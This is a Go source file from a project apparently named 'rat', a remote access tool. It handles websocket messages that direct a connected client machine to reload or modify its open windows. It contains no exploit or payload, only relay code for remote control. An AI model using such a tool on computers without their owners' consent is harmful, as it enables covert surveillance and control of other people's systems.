package main

import (
	"rat/shared"
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type WindowMessage struct {
	Monitors []shared.Monitor `json:"monitors,omitempty"`
	Frames   []shared.Window  `json:"frames,omitempty"`
	Action   int              `json:"action,omitempty"`
}

func (m WindowMessage) Header() MessageHeader {
	return Windows
}

func (d WindowMessage) Handle(ws *websocket.Conn, client *Client) error {
	client.Listeners[header.WindowsHeader] = ws

	packet := &WindowsPacket{}
	packet.Action = d.Action

	// If not a reload action, attach frames that will be modified
	if d.Action != shared.Reload {
		packet.Windows = d.Frames
	}

	client.Queue <- packet

	return nil
}
